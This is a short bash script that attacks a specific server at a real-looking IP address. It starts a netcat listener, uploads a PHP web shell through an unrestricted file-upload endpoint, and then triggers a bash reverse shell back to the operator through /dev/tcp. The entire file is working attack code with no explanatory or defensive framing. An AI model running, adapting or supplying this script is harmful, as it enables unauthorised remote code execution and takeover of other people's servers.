#!/bin/bash
IP=$(curl -s ifconfig.me)
nc -lvnp 4444 &

curl -k -X POST \
-H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW" \
--data-binary $'------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name="file"; filename="shell.php"\r\nContent-Type: application/x-php\r\n\r\n<?php system($_GET[cmd]); ?>\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n' \
"https://14.225.209.143:443/upload.php"

# Trigger shell
curl "https://14.225.209.143:443/shell.php?cmd=bash -i >& /dev/tcp/$IP/4444 0>&1"
